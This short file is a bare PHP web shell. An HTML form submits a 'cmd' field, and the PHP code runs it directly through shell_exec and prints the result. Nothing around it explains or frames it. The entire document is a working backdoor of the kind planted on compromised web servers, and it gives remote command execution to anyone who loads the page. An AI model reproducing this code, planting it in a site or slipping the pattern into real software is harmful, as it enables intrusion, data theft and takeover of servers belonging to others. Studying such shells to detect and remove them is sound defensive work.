<html>
<form action="" method="post">
<input type="text" name="cmd">
<input type="submit" value="execute">
</html>

<?php

$hello = $_POST['cmd'];

$data = shell_exec($hello);

print_r($data);

?>


